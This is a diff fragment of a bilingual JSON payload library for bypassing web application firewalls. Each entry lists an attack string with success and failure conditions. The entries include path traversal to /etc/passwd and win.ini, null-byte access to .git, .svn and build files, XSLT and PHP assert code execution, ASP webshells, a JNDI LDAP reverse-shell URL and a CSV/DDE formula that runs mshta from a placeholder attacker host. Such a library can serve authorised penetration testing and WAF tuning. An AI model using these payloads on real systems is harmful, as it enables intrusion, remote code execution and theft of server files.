+            "en": "Trailing null. Success: JSON returned. Fails when: holds only on PHP below 5.3.4 or custom C-level truncation; modern parsers reject null bytes in paths."
+          },
+          "effectiveness": "C"
+        }
+      ]
+    },
+    {
+      "id": "bizlogic-ruby-gemfile",
+      "patches": [
+        {
+          "area": "wafBypass",
+          "index": 0,
+          "expectedCommand": "/Gemfile%00",
+          "description": {
+            "zh": "截断绕过。判据：返回 Gemfile。失效条件：仅 PHP<5.3.4 或自研 C 层截断成立，现代解析器已修复。",
+            "en": "Trailing null. Success: Gemfile returned. Fails when: holds only on PHP below 5.3.4 or custom C-level truncation; modern parsers reject null bytes in paths."
+          },
+          "effectiveness": "C"
+        }
+      ]
+    },
+    {
+      "id": "bizlogic-java-pom-xml",
+      "patches": [
+        {
+          "area": "wafBypass",
+          "index": 0,
+          "expectedCommand": "/pom.xml%00",
+          "description": {
+            "zh": "截断绕过。判据：返回 pom。失效条件：仅 PHP<5.3.4 或自研 C 层截断成立，现代解析器已修复。",
+            "en": "Trailing null. Success: pom returned. Fails when: holds only on PHP below 5.3.4 or custom C-level truncation; modern parsers reject null bytes in paths."
+          },
+          "effectiveness": "C"
+        }
+      ]
+    },
+    {
+      "id": "api2-variable-path-boundary",
+      "patches": [
+        {
+          "area": "wafBypass",
+          "index": 2,
+          "expectedCommand": "{\"query\":\"query($id:String!){user(id:$id){id email role}}\",\"variables\":{\"id\":\"/etc/passwd%00\"}}",
+          "description": {
+            "zh": "绝对路径加空字节。判据：读取成功。失效条件：仅 PHP<5.3.4 或自研 C 层截断成立，现代解析器已修复。",
+            "en": "Absolute path with null byte. Success: read succeeds. Fails when: holds only on PHP below 5.3.4 or custom C-level truncation; modern parsers reject null bytes in paths."
+          },
+          "effectiveness": "C"
+        }
+      ]
+    },
+    {
+      "id": "ssrf2-git",
+      "patches": [
+        {
+          "area": "wafBypass",
+          "index": 0,
+          "expectedCommand": "/.git/HEAD%00",
+          "description": {
+            "zh": "绕过以 .git/HEAD 结尾的精确黑名单：截断符改变字面形态。判据：返回 ref 内容而非拦截页。失效条件：仅 PHP<5.3.4 或自研 C 层截断成立，现代解析器已修复。",
+            "en": "Trailing null byte changes the literal form. Success: ref content returned instead of a block page. Fails when: holds only on PHP below 5.3.4 or custom C-level truncation; modern parsers reject null bytes in paths."
+          },
+          "effectiveness": "C"
+        }
+      ]
+    },
+    {
+      "id": "ssrf2-svn",
+      "patches": [
+        {
+          "area": "wafBypass",
+          "index": 0,
+          "expectedCommand": "/.svn/wc.db%00",
+          "description": {
+            "zh": "截断符绕过 wc.db 精确匹配。判据：下载数据库文件。失效条件：仅 PHP<5.3.4 或自研 C 层截断成立，现代解析器已修复。",
+            "en": "Null byte evades exact wc.db matching. Success: database downloaded. Fails when: holds only on PHP below 5.3.4 or custom C-level truncation; modern parsers reject null bytes in paths."
+          },
+          "effectiveness": "C"
+        }
+      ]
+    },
+    {
+      "id": "ssrf2-build-file-exposure",
+      "patches": [
+        {
+          "area": "wafBypass",
+          "index": 0,
+          "expectedCommand": "/Jenkinsfile%00",
+          "description": {
+            "zh": "绕过以文件名结尾的精确规则。判据：返回文件内容。失效条件：仅 PHP<5.3.4 或自研 C 层截断成立，现代解析器已修复。",
+            "en": "Trailing null byte. Success: file content returned. Fails when: holds only on PHP below 5.3.4 or custom C-level truncation; modern parsers reject null bytes in paths."
+          },
+          "effectiveness": "C"
+        }
+      ]
+    },
+    {
+      "id": "file-upload-extension-normalization",
+      "patches": [
+        {
+          "area": "wafBypass",
+          "index": 0,
+          "expectedCommand": "PAYLOADER_MARKER.php%2500.jpg",
+          "description": {
+            "zh": "服务端二次解码后截断为 .php。判据：存储文件为可执行 php。失效条件：仅对做二次 URL 解码的架构成立。",
+            "en": "Second decode stage truncates to .php. Success: stored file executes. Fails when: only holds on architectures that perform a second URL decode."
+          },
+          "effectiveness": "C"
+        }
+      ]
+    },
+    {
+      "id": "file-download-path-normalization",
+      "patches": [
+        {
+          "area": "wafBypass",
+          "index": 0,
+          "expectedCommand": "?file=%252e%252e%252fetc%252fpasswd",
+          "description": {
+            "zh": "双重解码后还原 ../。判据：返回 passwd 内容。失效条件：仅对做二次 URL 解码的架构成立。",
+            "en": "Double decoding restores ../. Success: passwd returned. Fails when: only holds on architectures that perform a second URL decode."
+          },
+          "effectiveness": "C"
+        }
+      ]
+    },
+    {
+      "id": "file-traversal-windows-normalization",
+      "patches": [
+        {
+          "area": "wafBypass",
+          "index": 1,
+          "expectedCommand": "..%255c..%255cwindows%255cwin.ini",
+          "description": {
+            "zh": "二次解码还原遍历。判据：内容返回。失效条件：仅对做二次 URL 解码的架构成立。",
+            "en": "Double decoding restores traversal. Success: content returned. Fails when: only holds on architectures that perform a second URL decode."
+          },
+          "effectiveness": "C"
+        }
+      ]
+    },
+    {
+      "id": "inject2-xslt-php-rce",
+      "patches": [
+        {
+          "area": "wafBypass",
+          "index": 0,
+          "expectedCommand": "<?xml version=\"1.0\" encoding=\"UTF-8\"?><xsl:stylesheet version=\"1.0\" xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\" xmlns:php=\"http://php.net/xsl\"><xsl:template match=\"/\"><xsl:value-of select=\"php:function('sYstEm','id')\"/></xsl:template></xsl:stylesheet>",
+          "description": {
+            "zh": "绕过对 php:function('system' 精确匹配的 WAF：PHP 函数名大小写不敏感；成功判据：XSLT 渲染输出含 uid。失效条件：现代 WAF 请求归一化后大小写混淆普遍失效，仅对自研大小写敏感正则成立。",
+            "en": "Bypasses exact matching of php:function('system' since PHP function names are case-insensitive. Success: XSLT output contains uid. Fails when: modern WAFs normalize letter case before matching, so case confusion only holds against custom case-sensitive regex rules."
+          },
+          "effectiveness": "C"
+        },
+        {
+          "area": "wafBypass",
+          "index": 1,
+          "expectedCommand": "<?xml version=\"1.0\" encoding=\"UTF-8\"?><xsl:stylesheet version=\"1.0\" xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\" xmlns:php=\"http://php.net/xsl\"><xsl:template match=\"/\"><xsl:value-of select=\"php:function('shell_exec','id')\"/></xsl:template></xsl:stylesheet>",
+          "description": {
+            "zh": "换用 shell_exec sink，规避仅拦截 system/passthru 的规则；成功判据：输出 uid 信息。失效条件：现代 WAF 请求归一化后大小写混淆普遍失效，仅对自研大小写敏感正则成立。",
+            "en": "Switches the sink to shell_exec to evade rules blocking only system/passthru. Success: uid info in output. Fails when: modern WAFs normalize letter case before matching, so case confusion only holds against custom case-sensitive regex rules."
+          },
+          "effectiveness": "C"
+        }
+      ]
+    },
+    {
+      "id": "inject2-jndi-injection-265-lines",
+      "patches": [
+        {
+          "area": "wafBypass",
+          "index": 2,
+          "expectedCommand": "LDAP://{ATTACKER_HOST}:1389/Basic/ReverseShell/{ATTACKER_HOST}/{LPORT}",
+          "description": {
+            "zh": "利用 URL scheme 大小写不敏感特性，绕过小写 ldap:// 特征匹配；成功判据：JNDI 客户端发起回连。失效条件：现代 WAF 请求归一化后大小写混淆普遍失效，仅对自研大小写敏感正则成立。",
+            "en": "Exploits case-insensitive URL schemes to evade lowercase ldap:// matching. Success: the JNDI client connects back. Fails when: modern WAFs normalize letter case before matching, so case confusion only holds against custom case-sensitive regex rules."
+          },
+          "effectiveness": "C"
+        }
+      ]
+    },
+    {
+      "id": "cmdi2-php-runtime-stream-boundaries",
+      "patches": [
+        {
+          "area": "wafBypass",
+          "index": 2,
+          "expectedCommand": "PHP://stdin",
+          "description": {
+            "zh": "大小写变形 — 绕过对全小写标准形式的匹配：scheme 与流名大小写不敏感仍被流层识别（php:// 路径需精确匹配，不支持冗余斜杠）；流可打开即成功。失效条件：现代 WAF 请求归一化后大小写混淆普遍失效，仅对自研大小写敏感正则成立。",
+            "en": "Mutate case and add redundant slashes, still registered by the stream layer; the stream opening confirms success. Fails when: modern WAFs normalize letter case before matching, so case confusion only holds against custom case-sensitive regex rules."
+          },
+          "effectiveness": "C"
+        }
+      ]
+    },
+    {
+      "id": "webshell-asp",
+      "patches": [
+        {
+          "area": "wafBypass",
+          "index": 2,
+          "expectedCommand": "<%eXeCuTe rEqUeSt(\"a\")%>",
+          "description": {
+            "zh": "全标识符混合大小写，规避大小写敏感的正则；成功判据：代码执行成功。失效条件：现代 WAF 请求归一化后大小写混淆普遍失效，仅对自研大小写敏感正则成立。",
+            "en": "Applies mixed case across identifiers to defeat case-sensitive regexes. Success: code executes. Fails when: modern WAFs normalize letter case before matching, so case confusion only holds against custom case-sensitive regex rules."
+          },
+          "effectiveness": "C"
+        }
+      ]
+    },
+    {
+      "id": "webshell-php-ext",
+      "patches": [
+        {
+          "area": "wafBypass",
+          "index": 2,
+          "expectedCommand": "O:1:\"a\":1:{s:3:\"var\";s:3:\"123\";}",
+          "description": {
+            "zh": "利用 PHP 类名大小写不敏感特性改小写类名，绕过精确匹配 \"A\" 的规则；成功判据：目标类仍被实例化。失效条件：现代 WAF 请求归一化后大小写混淆普遍失效，仅对自研大小写敏感正则成立。",
+            "en": "Exploits PHP class-name case insensitivity with a lowercase name to bypass exact-match rules on \"A\". Success: the target class is still instantiated. Fails when: modern WAFs normalize letter case before matching, so case confusion only holds against custom case-sensitive regex rules."
+          },
+          "effectiveness": "C"
+        }
+      ]
+    },
+    {
+      "id": "lfi-zip-member-read-boundary",
+      "patches": [
+        {
+          "area": "wafBypass",
+          "index": 2,
+          "expectedCommand": "?file=ZIP://./payloader-fixture/PAYLOADER_MARKER.zip%23marker.txt",
+          "description": {
+            "zh": "绕过对全小写 zip:// 匹配：大写包装器名仍被流层注册；成员内容回显即成功。失效条件：现代 WAF 请求归一化后大小写混淆普遍失效，仅对自研大小写敏感正则成立。",
+            "en": "Uppercase the wrapper, still registered by the stream layer; echoed member content confirms success. Fails when: modern WAFs normalize letter case before matching, so case confusion only holds against custom case-sensitive regex rules."
+          },
+          "effectiveness": "C"
+        }
+      ]
+    },
+    {
+      "id": "file-upload-double-write-extension",
+      "patches": [
+        {
+          "area": "wafBypass",
+          "index": 1,
+          "expectedCommand": "PAYLOADER_MARKER.PpHpHp",
+          "description": {
+            "zh": "大小写变形叠加双写。判据：绕过大小写敏感剥离。失效条件：现代 WAF 请求归一化后大小写混淆普遍失效，仅对自研大小写敏感正则成立。",
+            "en": "Case variance on top of double writing. Success: survives case-sensitive stripping. Fails when: modern WAFs normalize letter case before matching, so case confusion only holds against custom case-sensitive regex rules."
+          },
+          "effectiveness": "C"
+        }
+      ]
+    },
+    {
+      "id": "rce-php",
+      "patches": [
+        {
+          "area": "wafBypass",
+          "index": 0,
+          "expectedCommand": "array_map('assert',array($_POST[cmd]));\ncall_user_func('assert',$_POST[cmd]);\n$a='assert';$a($_POST[cmd]);",
+          "description": {
+            "zh": "经 array_map、call_user_func 与变量函数间接调用 assert。命中判据：cmd 参数传入后返回命令输出。失效条件：仅 PHP <8.0（严格说 <7.2 无弃用警告）且 zend.assertions=1 时成立，PHP 8.0 起 assert 不再执行字符串代码。",
+            "en": "Invokes assert indirectly via array_map, call_user_func, and variable functions. Success check: passing cmd returns command output. Fails when: holds only on PHP below 8.0 (strictly below 7.2 to avoid deprecation warnings) with zend.assertions=1; since PHP 8.0, assert no longer evaluates string arguments."
+          },
+          "effectiveness": "C"
+        }
+      ]
+    },
+    {
+      "id": "inject2-csv-formula-injection-csv-form",
+      "patches": [
+        {
+          "area": "wafBypass",
+          "index": 2,
+          "expectedCommand": "+cmd|'/C mshta http://{ATTACKER_HOST}/a.hta'!A0",
+          "description": {
+            "zh": "加号前缀加 mshta 绕过 = 开头检测。判据：HTA 执行。失效条件：现代 Office（2018 年安全更新后）默认禁用 DDE 并要求双重确认，需用户忽略告警或目标为旧版 Office/Excel DDE 白名单才成立。",
+            "en": "Plus prefix with mshta evades = detection. Success: HTA runs. Fails when: modern Office disables DDE by default with double confirmation after the 2018 security updates, so this needs a user who dismisses the warning or a legacy Office DDE allowlist."
+          },
+          "effectiveness": "C"
+        },
+        {
+          "area": "wafBypass",
+          "index": 3,
+          "expectedCommand": "-2+3+cmd|'/C calc'!A0",
+          "description": {
+            "zh": "算术前缀伪装公式。判据：弹计算器。失效条件：现代 Office（2018 年安全更新后）默认禁用 DDE 并要求双重确认，需用户忽略告警或目标为旧版 Office/Excel DDE 白名单才成立。",
+            "en": "Arithmetic prefix disguise. Success: calc launches. Fails when: modern Office disables DDE by default with double confirmation after the 2018 security updates, so this needs a user who dismisses the warning or a legacy Office DDE allowlist."
+          },
+          "effectiveness": "C"
+        }
+      ]
+    },
+    {
+      "id": "inject2-wkhtmltopdf-scripted-file-iframe",
+      "patches": [
+        {
+          "area": "wafBypass",
+          "index": 2,
+          "expectedCommand": "<script>document.write('<iframe srcdoc=\"<iframe src=file:///etc/passwd>\"></iframe>')</script>",
+          "description": {
+            "zh": "srcdoc 内嵌 iframe 双层绕过。判据：内容渲染。失效条件：wkhtmltopdf 基于 QT WebKit（约 4.8 时代内核），可能忽略 srcdoc 属性，需实验验证后才可判定成立。",
+            "en": "Nested frame inside srcdoc. Success: content rendered. Fails when: wkhtmltopdf ships a QT WebKit kernel from roughly the 4.8 era that may ignore the srcdoc attribute, so the form needs experimental verification before it counts."
+          },
+          "effectiveness": "C"
+        }
+      ]
+    },
+    {
+      "id": "httpbypass-punycode",
+      "patches": [
+        {
+          "area": "wafBypass",
+          "index": 0,
+          "expectedCommand": "xn--%2f..%2f..%2fetc%2fpasswd",
+          "description": {
+            "zh": "前缀加编码遍历组合。判据：读出 passwd。失效条件：现代 WAF 与服务器不会对路径中的 xn-- 做 punycode 解码，仅历史 WAF 规则误把 xn-- 当异常串的场合成立，现代环境下无实际效果，教学保留。",
+            "en": "Prefix plus encoded traversal. Success: passwd read. Fails when: modern WAFs and servers never punycode-decode xn-- inside the path, so the trick only worked against legacy rules that flagged xn-- as an anomaly and has no real effect today; kept for teaching."
+          },
+          "effectiveness": "C"
+        },
+        {
+          "area": "wafBypass",
+          "index": 1,
+          "expectedCommand": "XN--/../../boot.ini",
+          "description": {
+            "zh": "大小写混写。判据：200。失效条件：现代 WAF 与服务器不会对路径中的 xn-- 做 punycode 解码，仅历史 WAF 规则误把 xn-- 当异常串的场合成立，现代环境下无实际效果，教学保留。",
+            "en": "Case variance. Success: 200. Fails when: modern WAFs and servers never punycode-decode xn-- inside the path, so the trick only worked against legacy rules that flagged xn-- as an anomaly and has no real effect today; kept for teaching."
+          },
+          "effectiveness": "C"
+        },
+        {
+          "area": "wafBypass",
+          "index": 2,
+          "expectedCommand": "xn--p1ai/../../etc/passwd",
+          "description": {
+            "zh": "以真实 IDN 前缀混淆规则。判据：遍历成功。失效条件：现代 WAF 与服务器不会对路径中的 xn-- 做 punycode 解码，仅历史 WAF 规则误把 xn-- 当异常串的场合成立，现代环境下无实际效果，教学保留。",
+            "en": "Real IDN prefix confuses rules. Success: traversal works. Fails when: modern WAFs and servers never punycode-decode xn-- inside the path, so the trick only worked against legacy rules that flagged xn-- as an anomaly and has no real effect today; kept for teaching."
+          },
+          "effectiveness": "C"
+        }
+      ]
+    },
+    {
+      "id": "lfi-input-stream-read-boundary",
+      "patches": [
+        {
+          "area": "wafBypass",
+          "index": 2,
+          "expectedCommand": "curl --fail --silent --show-error --max-time 3 -H \"Content-Type: text/plain\" --data-binary \"PAYLOADER_MARKER\" \"http://127.0.0.1:8080/include?file=PHP://Input\"",
+          "description": {
+            "zh": "绕过对全小写包装器名匹配：大写混合仍被流层识别；请求体内容进入包含流程即成功。失效条件：现代 WAF 请求归一化后大小写混淆普遍失效，仅对自研大小写敏感正则成立。",
+            "en": "Mixed-case the wrapper name, still recognized by the stream layer; request-body content entering inclusion confirms success. Failure condition: case obfuscation broadly fails against modern WAF request normalization and only works against custom case-sensitive regex filters."
+          },
+          "effectiveness": "C"
+        }
+      ]
+    }
+  ]
+}
